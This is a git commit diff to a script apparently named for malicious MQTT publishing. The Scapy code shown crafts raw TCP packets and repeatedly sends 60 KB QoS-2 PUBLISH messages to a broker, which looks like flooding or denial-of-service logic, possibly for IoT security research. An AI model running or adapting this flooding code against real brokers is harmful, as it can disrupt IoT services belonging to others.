e20e7c468d6e2a12be5ca82550eb936a116a8841
Erick Silva <ericksilvarod@gmail.com>
2024-04-29 18:38:06 +0300

    added different type of random to topic

--- scripts/mal_pub.py
+++ scripts/mal_pub.py
@@ -121,14 +121,14 @@ seq = ack.seq + len(connect_pkt)
 #seq = seq + 1
 
 # Craft an MQTT PUBLISH packet to send a message
-topic = "sensor/" + str(random.randint(1, 65000))
+topic = "sensor/" + str(uuid.uuid4())
 MAX_SIZE = 60 * 1024  # 60 KB
 message = "A" * MAX_SIZE
 publish_pkt = create_publish_packet(topic, message)
 # Loop for TCP connection, MQTT connection, sending packets, and disconnecting
 for i in range(number_packets):
     # publish_pkt.show()
-    message_id = random.randint(1, 65000) # Generate a unique message ID for each message
+    message_id = i + 1 # Generate a unique message ID for each message
     publish_pkt = MQTT(QOS=2)/MQTTPublish(topic=topic, value=message, msgid=message_id)
     send(ip/TCP(sport=src_port, dport=broker_port, flags="PA", seq=seq, ack=ack.ack)/publish_pkt, verbose=False)
     seq += len(publish_pkt) # +1 for the ACK?
